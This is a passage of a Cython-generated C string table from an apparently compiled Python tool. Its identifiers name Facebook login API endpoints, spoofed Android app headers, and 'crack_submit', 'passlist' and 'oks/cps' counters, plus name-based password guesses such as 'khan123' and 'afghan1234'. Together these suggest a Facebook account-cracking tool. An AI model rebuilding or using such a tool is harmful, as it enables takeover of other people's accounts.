    {&__pyx_kp_s__25, __pyx_k__25, sizeof(__pyx_k__25), 0, 0, 1, 0},
    {&__pyx_kp_s__29, __pyx_k__29, sizeof(__pyx_k__29), 0, 0, 1, 0},
    {&__pyx_n_s__31, __pyx_k__31, sizeof(__pyx_k__31), 0, 0, 1, 1},
    {&__pyx_kp_s__52, __pyx_k__52, sizeof(__pyx_k__52), 0, 0, 1, 0},
    {&__pyx_kp_s__63, __pyx_k__63, sizeof(__pyx_k__63), 0, 0, 1, 0},
    {&__pyx_kp_s__68, __pyx_k__68, sizeof(__pyx_k__68), 0, 0, 1, 0},
    {&__pyx_kp_u__72, __pyx_k__72, sizeof(__pyx_k__72), 0, 1, 0, 0},
    {&__pyx_kp_s__75, __pyx_k__75, sizeof(__pyx_k__75), 0, 0, 1, 0},
    {&__pyx_kp_u__76, __pyx_k__76, sizeof(__pyx_k__76), 0, 1, 0, 0},
    {&__pyx_kp_u__77, __pyx_k__77, sizeof(__pyx_k__77), 0, 1, 0, 0},
    {&__pyx_kp_u__91, __pyx_k__91, sizeof(__pyx_k__91), 0, 1, 0, 0},
    {&__pyx_kp_u__92, __pyx_k__92, sizeof(__pyx_k__92), 0, 1, 0, 0},
    {&__pyx_n_s_a, __pyx_k_a, sizeof(__pyx_k_a), 0, 0, 1, 1},
    {&__pyx_kp_s_a_code_to_use, __pyx_k_a_code_to_use, sizeof(__pyx_k_a_code_to_use), 0, 0, 1, 0},
    {&__pyx_n_s_aa, __pyx_k_aa, sizeof(__pyx_k_aa), 0, 0, 1, 1},
    {&__pyx_n_s_accept, __pyx_k_accept, sizeof(__pyx_k_accept), 0, 0, 1, 1},
    {&__pyx_kp_s_accept_encoding, __pyx_k_accept_encoding, sizeof(__pyx_k_accept_encoding), 0, 0, 1, 0},
    {&__pyx_kp_s_accept_language, __pyx_k_accept_language, sizeof(__pyx_k_accept_language), 0, 0, 1, 0},
    {&__pyx_n_s_accessToken, __pyx_k_accessToken, sizeof(__pyx_k_accessToken), 0, 0, 1, 1},
    {&__pyx_n_s_adid, __pyx_k_adid, sizeof(__pyx_k_adid), 0, 0, 1, 1},
    {&__pyx_n_s_afghan123, __pyx_k_afghan123, sizeof(__pyx_k_afghan123), 0, 0, 1, 1},
    {&__pyx_n_s_afghan1234, __pyx_k_afghan1234, sizeof(__pyx_k_afghan1234), 0, 0, 1, 1},
    {&__pyx_n_s_afghan12345, __pyx_k_afghan12345, sizeof(__pyx_k_afghan12345), 0, 0, 1, 1},
    {&__pyx_n_s_agent, __pyx_k_agent, sizeof(__pyx_k_agent), 0, 0, 1, 1},
    {&__pyx_n_s_allow_redirects, __pyx_k_allow_redirects, sizeof(__pyx_k_allow_redirects), 0, 0, 1, 1},
    {&__pyx_n_s_am, __pyx_k_am, sizeof(__pyx_k_am), 0, 0, 1, 1},
    {&__pyx_n_s_android_version, __pyx_k_android_version, sizeof(__pyx_k_android_version), 0, 0, 1, 1},
    {&__pyx_n_s_api, __pyx_k_api, sizeof(__pyx_k_api), 0, 0, 1, 1},
    {&__pyx_n_s_api1, __pyx_k_api1, sizeof(__pyx_k_api1), 0, 0, 1, 1},
    {&__pyx_n_s_api1_locals_genexpr, __pyx_k_api1_locals_genexpr, sizeof(__pyx_k_api1_locals_genexpr), 0, 0, 1, 1},
    {&__pyx_n_s_api_locals_genexpr, __pyx_k_api_locals_genexpr, sizeof(__pyx_k_api_locals_genexpr), 0, 0, 1, 1},
    {&__pyx_n_s_append, __pyx_k_append, sizeof(__pyx_k_append), 0, 0, 1, 1},
    {&__pyx_kp_s_application_x_www_form_urlencode, __pyx_k_application_x_www_form_urlencode, sizeof(__pyx_k_application_x_www_form_urlencode), 0, 0, 1, 0},
    {&__pyx_n_s_args, __pyx_k_args, sizeof(__pyx_k_args), 0, 0, 1, 1},
    {&__pyx_n_s_asyncio_coroutines, __pyx_k_asyncio_coroutines, sizeof(__pyx_k_asyncio_coroutines), 0, 0, 1, 1},
    {&__pyx_n_s_authenticate, __pyx_k_authenticate, sizeof(__pyx_k_authenticate), 0, 0, 1, 1},
    {&__pyx_n_s_b, __pyx_k_b, sizeof(__pyx_k_b), 0, 0, 1, 1},
    {&__pyx_n_s_base64, __pyx_k_base64, sizeof(__pyx_k_base64), 0, 0, 1, 1},
    {&__pyx_n_s_bd, __pyx_k_bd, sizeof(__pyx_k_bd), 0, 0, 1, 1},
    {&__pyx_n_s_bd_locals_genexpr, __pyx_k_bd_locals_genexpr, sizeof(__pyx_k_bd_locals_genexpr), 0, 0, 1, 1},
    {&__pyx_n_s_build, __pyx_k_build, sizeof(__pyx_k_build), 0, 0, 1, 1},
    {&__pyx_n_s_button_with_disabled, __pyx_k_button_with_disabled, sizeof(__pyx_k_button_with_disabled), 0, 0, 1, 1},
    {&__pyx_n_s_c, __pyx_k_c, sizeof(__pyx_k_c), 0, 0, 1, 1},
    {&__pyx_n_s_c_user, __pyx_k_c_user, sizeof(__pyx_k_c_user), 0, 0, 1, 1},
    {&__pyx_n_s_check_output, __pyx_k_check_output, sizeof(__pyx_k_check_output), 0, 0, 1, 1},
    {&__pyx_n_s_checkpoint, __pyx_k_checkpoint, sizeof(__pyx_k_checkpoint), 0, 0, 1, 1},
    {&__pyx_n_s_choice, __pyx_k_choice, sizeof(__pyx_k_choice), 0, 0, 1, 1},
    {&__pyx_n_s_choices, __pyx_k_choices, sizeof(__pyx_k_choices), 0, 0, 1, 1},
    {&__pyx_n_s_clear, __pyx_k_clear, sizeof(__pyx_k_clear), 0, 0, 1, 1},
    {&__pyx_n_s_client_country_code, __pyx_k_client_country_code, sizeof(__pyx_k_client_country_code), 0, 0, 1, 1},
    {&__pyx_n_s_cline_in_traceback, __pyx_k_cline_in_traceback, sizeof(__pyx_k_cline_in_traceback), 0, 0, 1, 1},
    {&__pyx_n_s_close, __pyx_k_close, sizeof(__pyx_k_close), 0, 0, 1, 1},
    {&__pyx_n_s_code, __pyx_k_code, sizeof(__pyx_k_code), 0, 0, 1, 1},
    {&__pyx_kp_s_com_facebook_adsmanager, __pyx_k_com_facebook_adsmanager, sizeof(__pyx_k_com_facebook_adsmanager), 0, 0, 1, 0},
    {&__pyx_kp_s_com_facebook_katana, __pyx_k_com_facebook_katana, sizeof(__pyx_k_com_facebook_katana), 0, 0, 1, 0},
    {&__pyx_kp_s_com_facebook_lite, __pyx_k_com_facebook_lite, sizeof(__pyx_k_com_facebook_lite), 0, 0, 1, 0},
    {&__pyx_kp_s_com_facebook_mlite, __pyx_k_com_facebook_mlite, sizeof(__pyx_k_com_facebook_mlite), 0, 0, 1, 0},
    {&__pyx_kp_s_com_facebook_orca, __pyx_k_com_facebook_orca, sizeof(__pyx_k_com_facebook_orca), 0, 0, 1, 0},
    {&__pyx_n_s_community_id, __pyx_k_community_id, sizeof(__pyx_k_community_id), 0, 0, 1, 1},
    {&__pyx_n_s_complete, __pyx_k_complete, sizeof(__pyx_k_complete), 0, 0, 1, 1},
    {&__pyx_n_s_concurrent_futures, __pyx_k_concurrent_futures, sizeof(__pyx_k_concurrent_futures), 0, 0, 1, 1},
    {&__pyx_n_s_cookies, __pyx_k_cookies, sizeof(__pyx_k_cookies), 0, 0, 1, 1},
    {&__pyx_n_s_cpl, __pyx_k_cpl, sizeof(__pyx_k_cpl), 0, 0, 1, 1},
    {&__pyx_n_s_cps, __pyx_k_cps, sizeof(__pyx_k_cps), 0, 0, 1, 1},
    {&__pyx_n_s_crack_submit, __pyx_k_crack_submit, sizeof(__pyx_k_crack_submit), 0, 0, 1, 1},
    {&__pyx_n_s_credentials_type, __pyx_k_credentials_type, sizeof(__pyx_k_credentials_type), 0, 0, 1, 1},
    {&__pyx_n_s_currently_logged_in_userid, __pyx_k_currently_logged_in_userid, sizeof(__pyx_k_currently_logged_in_userid), 0, 0, 1, 1},
    {&__pyx_n_s_cx, __pyx_k_cx, sizeof(__pyx_k_cx), 0, 0, 1, 1},
    {&__pyx_n_s_d, __pyx_k_d, sizeof(__pyx_k_d), 0, 0, 1, 1},
    {&__pyx_n_s_data, __pyx_k_data, sizeof(__pyx_k_data), 0, 0, 1, 1},
    {&__pyx_kp_s_density_4_0_width_1440_height_3, __pyx_k_density_4_0_width_1440_height_3, sizeof(__pyx_k_density_4_0_width_1440_height_3), 0, 0, 1, 0},
    {&__pyx_kp_s_density_4_0_width_1440_height_3_2, __pyx_k_density_4_0_width_1440_height_3_2, sizeof(__pyx_k_density_4_0_width_1440_height_3_2), 0, 0, 1, 0},
    {&__pyx_n_s_device, __pyx_k_device, sizeof(__pyx_k_device), 0, 0, 1, 1},
    {&__pyx_n_s_device_id, __pyx_k_device_id, sizeof(__pyx_k_device_id), 0, 0, 1, 1},
    {&__pyx_n_s_digits, __pyx_k_digits, sizeof(__pyx_k_digits), 0, 0, 1, 1},
    {&__pyx_kp_u_disable, __pyx_k_disable, sizeof(__pyx_k_disable), 0, 1, 0, 0},
    {&__pyx_n_s_dnt, __pyx_k_dnt, sizeof(__pyx_k_dnt), 0, 0, 1, 1},
    {&__pyx_n_s_document, __pyx_k_document, sizeof(__pyx_k_document), 0, 0, 1, 1},
    {&__pyx_kp_s_domain, __pyx_k_domain, sizeof(__pyx_k_domain), 0, 0, 1, 0},
    {&__pyx_n_s_domain_2, __pyx_k_domain_2, sizeof(__pyx_k_domain_2), 0, 0, 1, 1},
    {&__pyx_n_s_dump, __pyx_k_dump, sizeof(__pyx_k_dump), 0, 0, 1, 1},
    {&__pyx_n_s_e, __pyx_k_e, sizeof(__pyx_k_e), 0, 0, 1, 1},
    {&__pyx_n_s_email, __pyx_k_email, sizeof(__pyx_k_email), 0, 0, 1, 1},
    {&__pyx_kp_s_en_US_FB4A_FBAV, __pyx_k_en_US_FB4A_FBAV, sizeof(__pyx_k_en_US_FB4A_FBAV), 0, 0, 1, 0},
    {&__pyx_kp_s_en_US_en_q_0_9, __pyx_k_en_US_en_q_0_9, sizeof(__pyx_k_en_US_en_q_0_9), 0, 0, 1, 0},
    {&__pyx_kp_s_en_us_10_T_Mobile_myTouch_3G_Sli, __pyx_k_en_us_10_T_Mobile_myTouch_3G_Sli, sizeof(__pyx_k_en_us_10_T_Mobile_myTouch_3G_Sli), 0, 0, 1, 0},
    {&__pyx_kp_u_enable, __pyx_k_enable, sizeof(__pyx_k_enable), 0, 1, 0, 0},
    {&__pyx_n_s_enroll_misauth, __pyx_k_enroll_misauth, sizeof(__pyx_k_enroll_misauth), 0, 0, 1, 1},
    {&__pyx_n_s_enter, __pyx_k_enter, sizeof(__pyx_k_enter), 0, 0, 1, 1},
    {&__pyx_n_s_error, __pyx_k_error, sizeof(__pyx_k_error), 0, 0, 1, 1},
    {&__pyx_n_s_error_data, __pyx_k_error_data, sizeof(__pyx_k_error_data), 0, 0, 1, 1},
    {&__pyx_n_s_error_detail_type, __pyx_k_error_detail_type, sizeof(__pyx_k_error_detail_type), 0, 0, 1, 1},
    {&__pyx_n_s_error_msg, __pyx_k_error_msg, sizeof(__pyx_k_error_msg), 0, 0, 1, 1},
    {&__pyx_n_s_exceptions, __pyx_k_exceptions, sizeof(__pyx_k_exceptions), 0, 0, 1, 1},
    {&__pyx_n_s_exit, __pyx_k_exit, sizeof(__pyx_k_exit), 0, 0, 1, 1},
    {&__pyx_n_s_exit_2, __pyx_k_exit_2, sizeof(__pyx_k_exit_2), 0, 0, 1, 1},
    {&__pyx_n_s_f, __pyx_k_f, sizeof(__pyx_k_f), 0, 0, 1, 1},
    {&__pyx_n_s_false, __pyx_k_false, sizeof(__pyx_k_false), 0, 0, 1, 1},
    {&__pyx_n_s_family, __pyx_k_family, sizeof(__pyx_k_family), 0, 0, 1, 1},
    {&__pyx_n_s_family_device_id, __pyx_k_family_device_id, sizeof(__pyx_k_family_device_id), 0, 0, 1, 1},
    {&__pyx_n_s_fb_api_req_friendly_name, __pyx_k_fb_api_req_friendly_name, sizeof(__pyx_k_fb_api_req_friendly_name), 0, 0, 1, 1},
    {&__pyx_n_s_fban, __pyx_k_fban, sizeof(__pyx_k_fban), 0, 0, 1, 1},
    {&__pyx_n_s_fbav, __pyx_k_fbav, sizeof(__pyx_k_fbav), 0, 0, 1, 1},
    {&__pyx_n_s_fbbd, __pyx_k_fbbd, sizeof(__pyx_k_fbbd), 0, 0, 1, 1},
    {&__pyx_n_s_fbbv, __pyx_k_fbbv, sizeof(__pyx_k_fbbv), 0, 0, 1, 1},
    {&__pyx_n_s_fbca, __pyx_k_fbca, sizeof(__pyx_k_fbca), 0, 0, 1, 1},
    {&__pyx_n_s_fbcr, __pyx_k_fbcr, sizeof(__pyx_k_fbcr), 0, 0, 1, 1},
    {&__pyx_n_s_fbdm, __pyx_k_fbdm, sizeof(__pyx_k_fbdm), 0, 0, 1, 1},
    {&__pyx_n_s_fbdv, __pyx_k_fbdv, sizeof(__pyx_k_fbdv), 0, 0, 1, 1},
    {&__pyx_n_s_fbfw, __pyx_k_fbfw, sizeof(__pyx_k_fbfw), 0, 0, 1, 1},
    {&__pyx_n_s_fbks, __pyx_k_fbks, sizeof(__pyx_k_fbks), 0, 0, 1, 1},
    {&__pyx_n_s_fblc, __pyx_k_fblc, sizeof(__pyx_k_fblc), 0, 0, 1, 1},
    {&__pyx_n_s_fbmf, __pyx_k_fbmf, sizeof(__pyx_k_fbmf), 0, 0, 1, 1},
    {&__pyx_n_s_fbpn, __pyx_k_fbpn, sizeof(__pyx_k_fbpn), 0, 0, 1, 1},
    {&__pyx_n_s_fbrv, __pyx_k_fbrv, sizeof(__pyx_k_fbrv), 0, 0, 1, 1},
    {&__pyx_n_s_fbsv, __pyx_k_fbsv, sizeof(__pyx_k_fbsv), 0, 0, 1, 1},
    {&__pyx_n_s_ffb, __pyx_k_ffb, sizeof(__pyx_k_ffb), 0, 0, 1, 1},
    {&__pyx_n_s_fikr, __pyx_k_fikr, sizeof(__pyx_k_fikr), 0, 0, 1, 1},
    {&__pyx_n_s_file, __pyx_k_file, sizeof(__pyx_k_file), 0, 0, 1, 1},
    {&__pyx_n_s_first, __pyx_k_first, sizeof(__pyx_k_first), 0, 0, 1, 1},
    {&__pyx_n_s_first123, __pyx_k_first123, sizeof(__pyx_k_first123), 0, 0, 1, 1},
    {&__pyx_n_s_first12345, __pyx_k_first12345, sizeof(__pyx_k_first12345), 0, 0, 1, 1},
    {&__pyx_n_s_first_name, __pyx_k_first_name, sizeof(__pyx_k_first_name), 0, 0, 1, 1},
    {&__pyx_n_s_firstlast, __pyx_k_firstlast, sizeof(__pyx_k_firstlast), 0, 0, 1, 1},
    {&__pyx_n_s_firstlast123, __pyx_k_firstlast123, sizeof(__pyx_k_firstlast123), 0, 0, 1, 1},
    {&__pyx_n_s_fkeyx, __pyx_k_fkeyx, sizeof(__pyx_k_fkeyx), 0, 0, 1, 1},
    {&__pyx_n_s_flow, __pyx_k_flow, sizeof(__pyx_k_flow), 0, 0, 1, 1},
    {&__pyx_kp_u_flow_login_no_pin_refsrc_deprec, __pyx_k_flow_login_no_pin_refsrc_deprec, sizeof(__pyx_k_flow_login_no_pin_refsrc_deprec), 0, 1, 0, 0},
    {&__pyx_n_s_flush, __pyx_k_flush, sizeof(__pyx_k_flush), 0, 0, 1, 1},
    {&__pyx_n_s_fn, __pyx_k_fn, sizeof(__pyx_k_fn), 0, 0, 1, 1},
    {&__pyx_n_s_fo, __pyx_k_fo, sizeof(__pyx_k_fo), 0, 0, 1, 1},
    {&__pyx_kp_s_for_log_in, __pyx_k_for_log_in, sizeof(__pyx_k_for_log_in), 0, 0, 1, 0},
    {&__pyx_n_s_format, __pyx_k_format, sizeof(__pyx_k_format), 0, 0, 1, 1},
    {&__pyx_n_s_fs, __pyx_k_fs, sizeof(__pyx_k_fs), 0, 0, 1, 1},
    {&__pyx_n_s_fullagnt, __pyx_k_fullagnt, sizeof(__pyx_k_fullagnt), 0, 0, 1, 1},
    {&__pyx_n_s_g, __pyx_k_g, sizeof(__pyx_k_g), 0, 0, 1, 1},
    {&__pyx_kp_u_gc, __pyx_k_gc, sizeof(__pyx_k_gc), 0, 1, 0, 0},
    {&__pyx_n_s_generate_analytics_claims, __pyx_k_generate_analytics_claims, sizeof(__pyx_k_generate_analytics_claims), 0, 0, 1, 1},
    {&__pyx_n_s_generate_machine_id, __pyx_k_generate_machine_id, sizeof(__pyx_k_generate_machine_id), 0, 0, 1, 1},
    {&__pyx_n_s_generate_session_cookies, __pyx_k_generate_session_cookies, sizeof(__pyx_k_generate_session_cookies), 0, 0, 1, 1},
    {&__pyx_n_s_genexpr, __pyx_k_genexpr, sizeof(__pyx_k_genexpr), 0, 0, 1, 1},
    {&__pyx_n_s_get, __pyx_k_get, sizeof(__pyx_k_get), 0, 0, 1, 1},
    {&__pyx_n_s_get_dict, __pyx_k_get_dict, sizeof(__pyx_k_get_dict), 0, 0, 1, 1},
    {&__pyx_n_s_getlog, __pyx_k_getlog, sizeof(__pyx_k_getlog), 0, 0, 1, 1},
    {&__pyx_n_s_gmail, __pyx_k_gmail, sizeof(__pyx_k_gmail), 0, 0, 1, 1},
    {&__pyx_n_s_gmail_locals_genexpr, __pyx_k_gmail_locals_genexpr, sizeof(__pyx_k_gmail_locals_genexpr), 0, 0, 1, 1},
    {&__pyx_n_s_group, __pyx_k_group, sizeof(__pyx_k_group), 0, 0, 1, 1},
    {&__pyx_n_s_gt, __pyx_k_gt, sizeof(__pyx_k_gt), 0, 0, 1, 1},
    {&__pyx_kp_s_gzip_deflate, __pyx_k_gzip_deflate, sizeof(__pyx_k_gzip_deflate), 0, 0, 1, 0},
    {&__pyx_kp_s_gzip_deflate_br, __pyx_k_gzip_deflate_br, sizeof(__pyx_k_gzip_deflate_br), 0, 0, 1, 0},
    {&__pyx_n_s_h, __pyx_k_h, sizeof(__pyx_k_h), 0, 0, 1, 1},
    {&__pyx_n_s_head, __pyx_k_head, sizeof(__pyx_k_head), 0, 0, 1, 1},
    {&__pyx_n_s_headers, __pyx_k_headers, sizeof(__pyx_k_headers), 0, 0, 1, 1},
    {&__pyx_n_s_hexdigits, __pyx_k_hexdigits, sizeof(__pyx_k_hexdigits), 0, 0, 1, 1},
    {&__pyx_kp_s_https_api_whatsapp_com_send_phon, __pyx_k_https_api_whatsapp_com_send_phon, sizeof(__pyx_k_https_api_whatsapp_com_send_phon), 0, 0, 1, 0},
    {&__pyx_kp_s_https_b_api_facebook_com_method, __pyx_k_https_b_api_facebook_com_method, sizeof(__pyx_k_https_b_api_facebook_com_method), 0, 0, 1, 0},
    {&__pyx_kp_s_https_b_graph_facebook_com_auth, __pyx_k_https_b_graph_facebook_com_auth, sizeof(__pyx_k_https_b_graph_facebook_com_auth), 0, 0, 1, 0},
    {&__pyx_kp_s_https_free_facebook_com_login_sa, __pyx_k_https_free_facebook_com_login_sa, sizeof(__pyx_k_https_free_facebook_com_login_sa), 0, 0, 1, 0},
    {&__pyx_kp_u_https_p_facebook_com_login_devic, __pyx_k_https_p_facebook_com_login_devic, sizeof(__pyx_k_https_p_facebook_com_login_devic), 0, 1, 0, 0},
    {&__pyx_kp_s_https_p_facebook_com_login_devic_2, __pyx_k_https_p_facebook_com_login_devic_2, sizeof(__pyx_k_https_p_facebook_com_login_devic_2), 0, 0, 1, 0},
    {&__pyx_n_s_i, __pyx_k_i, sizeof(__pyx_k_i), 0, 0, 1, 1},
    {&__pyx_n_s_id, __pyx_k_id, sizeof(__pyx_k_id), 0, 0, 1, 1},
    {&__pyx_n_s_idpass, __pyx_k_idpass, sizeof(__pyx_k_idpass), 0, 0, 1, 1},
    {&__pyx_n_s_ids, __pyx_k_ids, sizeof(__pyx_k_ids), 0, 0, 1, 1},
    {&__pyx_n_s_import, __pyx_k_import, sizeof(__pyx_k_import), 0, 0, 1, 1},
    {&__pyx_n_s_initializing, __pyx_k_initializing, sizeof(__pyx_k_initializing), 0, 0, 1, 1},
    {&__pyx_n_s_input, __pyx_k_input, sizeof(__pyx_k_input), 0, 0, 1, 1},
    {&__pyx_n_s_is_coroutine, __pyx_k_is_coroutine, sizeof(__pyx_k_is_coroutine), 0, 0, 1, 1},
    {&__pyx_kp_u_isenabled, __pyx_k_isenabled, sizeof(__pyx_k_isenabled), 0, 1, 0, 0},
    {&__pyx_n_s_j, __pyx_k_j, sizeof(__pyx_k_j), 0, 0, 1, 1},
    {&__pyx_n_s_j1, __pyx_k_j1, sizeof(__pyx_k_j1), 0, 0, 1, 1},
    {&__pyx_n_s_jazoest, __pyx_k_jazoest, sizeof(__pyx_k_jazoest), 0, 0, 1, 1},
    {&__pyx_n_s_join, __pyx_k_join, sizeof(__pyx_k_join), 0, 0, 1, 1},
    {&__pyx_n_s_json, __pyx_k_json, sizeof(__pyx_k_json), 0, 0, 1, 1},
    {&__pyx_n_s_k, __pyx_k_k, sizeof(__pyx_k_k), 0, 0, 1, 1},
    {&__pyx_n_s_keys, __pyx_k_keys, sizeof(__pyx_k_keys), 0, 0, 1, 1},
    {&__pyx_n_s_khan1122, __pyx_k_khan1122, sizeof(__pyx_k_khan1122), 0, 0, 1, 1},
    {&__pyx_n_s_khan123, __pyx_k_khan123, sizeof(__pyx_k_khan123), 0, 0, 1, 1},
    {&__pyx_n_s_khan12345, __pyx_k_khan12345, sizeof(__pyx_k_khan12345), 0, 0, 1, 1},
    {&__pyx_n_s_khan123456, __pyx_k_khan123456, sizeof(__pyx_k_khan123456), 0, 0, 1, 1},
    {&__pyx_n_s_khankhan, __pyx_k_khankhan, sizeof(__pyx_k_khankhan), 0, 0, 1, 1},
    {&__pyx_n_s_khankhan123, __pyx_k_khankhan123, sizeof(__pyx_k_khankhan123), 0, 0, 1, 1},
    {&__pyx_n_s_krk, __pyx_k_krk, sizeof(__pyx_k_krk), 0, 0, 1, 1},
    {&__pyx_kp_s_krk_py, __pyx_k_krk_py, sizeof(__pyx_k_krk_py), 0, 0, 1, 0},
    {&__pyx_n_s_l, __pyx_k_l, sizeof(__pyx_k_l), 0, 0, 1, 1},
    {&__pyx_n_s_last, __pyx_k_last, sizeof(__pyx_k_last), 0, 0, 1, 1},
    {&__pyx_n_s_last123, __pyx_k_last123, sizeof(__pyx_k_last123), 0, 0, 1, 1},
    {&__pyx_n_s_last1234, __pyx_k_last1234, sizeof(__pyx_k_last1234), 0, 0, 1, 1},
    {&__pyx_n_s_last12345, __pyx_k_last12345, sizeof(__pyx_k_last12345), 0, 0, 1, 1},
    {&__pyx_n_s_last_name, __pyx_k_last_name, sizeof(__pyx_k_last_name), 0, 0, 1, 1},
    {&__pyx_n_s_lchoice, __pyx_k_lchoice, sizeof(__pyx_k_lchoice), 0, 0, 1, 1},
    {&__pyx_n_s_li, __pyx_k_li, sizeof(__pyx_k_li), 0, 0, 1, 1},
    {&__pyx_n_s_li2, __pyx_k_li2, sizeof(__pyx_k_li2), 0, 0, 1, 1},
    {&__pyx_n_s_light, __pyx_k_light, sizeof(__pyx_k_light), 0, 0, 1, 1},
    {&__pyx_n_s_limit, __pyx_k_limit, sizeof(__pyx_k_limit), 0, 0, 1, 1},
    {&__pyx_n_s_linex, __pyx_k_linex, sizeof(__pyx_k_linex), 0, 0, 1, 1},
    {&__pyx_n_s_lists, __pyx_k_lists, sizeof(__pyx_k_lists), 0, 0, 1, 1},
    {&__pyx_n_s_ln, __pyx_k_ln, sizeof(__pyx_k_ln), 0, 0, 1, 1},
    {&__pyx_n_s_locale, __pyx_k_locale, sizeof(__pyx_k_locale), 0, 0, 1, 1},
    {&__pyx_n_s_login, __pyx_k_login, sizeof(__pyx_k_login), 0, 0, 1, 1},
    {&__pyx_n_s_login_no_pin, __pyx_k_login_no_pin, sizeof(__pyx_k_login_no_pin), 0, 0, 1, 1},
    {&__pyx_n_s_logo, __pyx_k_logo, sizeof(__pyx_k_logo), 0, 0, 1, 1},
    {&__pyx_n_s_loop, __pyx_k_loop, sizeof(__pyx_k_loop), 0, 0, 1, 1},
    {&__pyx_n_s_lower, __pyx_k_lower, sizeof(__pyx_k_lower), 0, 0, 1, 1},
    {&__pyx_n_s_ls, __pyx_k_ls, sizeof(__pyx_k_ls), 0, 0, 1, 1},
    {&__pyx_n_s_lsd, __pyx_k_lsd, sizeof(__pyx_k_lsd), 0, 0, 1, 1},
    {&__pyx_n_s_mail, __pyx_k_mail, sizeof(__pyx_k_mail), 0, 0, 1, 1},
    {&__pyx_n_s_main, __pyx_k_main, sizeof(__pyx_k_main), 0, 0, 1, 1},
    {&__pyx_n_s_max_workers, __pyx_k_max_workers, sizeof(__pyx_k_max_workers), 0, 0, 1, 1},
    {&__pyx_n_s_menu, __pyx_k_menu, sizeof(__pyx_k_menu), 0, 0, 1, 1},
    {&__pyx_n_s_message, __pyx_k_message, sizeof(__pyx_k_message), 0, 0, 1, 1},
    {&__pyx_n_s_meta_inf_fbmeta, __pyx_k_meta_inf_fbmeta, sizeof(__pyx_k_meta_inf_fbmeta), 0, 0, 1, 1},
    {&__pyx_n_s_model, __pyx_k_model, sizeof(__pyx_k_model), 0, 0, 1, 1},
    {&__pyx_n_s_mthd, __pyx_k_mthd, sizeof(__pyx_k_mthd), 0, 0, 1, 1},
    {&__pyx_n_s_n, __pyx_k_n, sizeof(__pyx_k_n), 0, 0, 1, 1},
    {&__pyx_n_s_name, __pyx_k_name, sizeof(__pyx_k_name), 0, 0, 1, 1},
    {&__pyx_n_s_name_2, __pyx_k_name_2, sizeof(__pyx_k_name_2), 0, 0, 1, 1},
    {&__pyx_kp_s_name_jazoest_value, __pyx_k_name_jazoest_value, sizeof(__pyx_k_name_jazoest_value), 0, 0, 1, 0},
    {&__pyx_kp_s_name_lsd_value, __pyx_k_name_lsd_value, sizeof(__pyx_k_name_lsd_value), 0, 0, 1, 0},
    {&__pyx_n_s_names, __pyx_k_names, sizeof(__pyx_k_names), 0, 0, 1, 1},
    {&__pyx_n_s_navigate, __pyx_k_navigate, sizeof(__pyx_k_navigate), 0, 0, 1, 1},
    {&__pyx_n_s_next, __pyx_k_next, sizeof(__pyx_k_next), 0, 0, 1, 1},
    {&__pyx_n_s_nmbr, __pyx_k_nmbr, sizeof(__pyx_k_nmbr), 0, 0, 1, 1},
    {&__pyx_n_s_nmp, __pyx_k_nmp, sizeof(__pyx_k_nmp), 0, 0, 1, 1},
    {&__pyx_n_s_none, __pyx_k_none, sizeof(__pyx_k_none), 0, 0, 1, 1},
    {&__pyx_n_s_oks, __pyx_k_oks, sizeof(__pyx_k_oks), 0, 0, 1, 1},
    {&__pyx_n_s_open, __pyx_k_open, sizeof(__pyx_k_open), 0, 0, 1, 1},
    {&__pyx_n_s_os, __pyx_k_os, sizeof(__pyx_k_os), 0, 0, 1, 1},
    {&__pyx_kp_s_p_facebook_com, __pyx_k_p_facebook_com, sizeof(__pyx_k_p_facebook_com), 0, 0, 1, 0},
    {&__pyx_n_s_pak, __pyx_k_pak, sizeof(__pyx_k_pak), 0, 0, 1, 1},
    {&__pyx_n_s_pak_locals_genexpr, __pyx_k_pak_locals_genexpr, sizeof(__pyx_k_pak_locals_genexpr), 0, 0, 1, 1},
    {&__pyx_n_s_pas, __pyx_k_pas, sizeof(__pyx_k_pas), 0, 0, 1, 1},
    {&__pyx_n_s_pass, __pyx_k_pass, sizeof(__pyx_k_pass), 0, 0, 1, 1},
    {&__pyx_n_s_passlist, __pyx_k_passlist, sizeof(__pyx_k_passlist), 0, 0, 1, 1},
    {&__pyx_n_s_password, __pyx_k_password, sizeof(__pyx_k_password), 0, 0, 1, 1},
    {&__pyx_n_s_path, __pyx_k_path, sizeof(__pyx_k_path), 0, 0, 1, 1},
    {&__pyx_n_s_pcp, __pyx_k_pcp, sizeof(__pyx_k_pcp), 0, 0, 1, 1},
    {&__pyx_n_s_pip, __pyx_k_pip, sizeof(__pyx_k_pip), 0, 0, 1, 1},
    {&__pyx_kp_s_pip_install_requests_futures_2_d, __pyx_k_pip_install_requests_futures_2_d, sizeof(__pyx_k_pip_install_requests_futures_2_d), 0, 0, 1, 0},
    {&__pyx_n_s_plist, __pyx_k_plist, sizeof(__pyx_k_plist), 0, 0, 1, 1},
    {&__pyx_n_s_po, __pyx_k_po, sizeof(__pyx_k_po), 0, 0, 1, 1},
    {&__pyx_n_s_post, __pyx_k_post, sizeof(__pyx_k_post), 0, 0, 1, 1},
    {&__pyx_n_s_ppp, __pyx_k_ppp, sizeof(__pyx_k_ppp), 0, 0, 1, 1},
    {&__pyx_n_s_print, __pyx_k_print, sizeof(__pyx_k_print), 0, 0, 1, 1},
    {&__pyx_n_s_ps, __pyx_k_ps, sizeof(__pyx_k_ps), 0, 0, 1, 1},
    {&__pyx_n_s_ps2, __pyx_k_ps2, sizeof(__pyx_k_ps2), 0, 0, 1, 1},
    {&__pyx_n_s_ps_limit, __pyx_k_ps_limit, sizeof(__pyx_k_ps_limit), 0, 0, 1, 1},
    {&__pyx_n_s_psx, __pyx_k_psx, sizeof(__pyx_k_psx), 0, 0, 1, 1},
    {&__pyx_n_s_public, __pyx_k_public, sizeof(__pyx_k_public), 0, 0, 1, 1},
    {&__pyx_n_s_pw, __pyx_k_pw, sizeof(__pyx_k_pw), 0, 0, 1, 1},
    {&__pyx_kp_s_python_AKING_py, __pyx_k_python_AKING_py, sizeof(__pyx_k_python_AKING_py), 0, 0, 1, 0},
    {&__pyx_kp_s_python_ZEA, __pyx_k_python_ZEA, sizeof(__pyx_k_python_ZEA), 0, 0, 1, 0},
    {&__pyx_kp_s_python_ZEA_py, __pyx_k_python_ZEA_py, sizeof(__pyx_k_python_ZEA_py), 0, 0, 1, 0},
    {&__pyx_n_s_r, __pyx_k_r, sizeof(__pyx_k_r), 0, 0, 1, 1},
    {&__pyx_n_s_randint, __pyx_k_randint, sizeof(__pyx_k_randint), 0, 0, 1, 1},
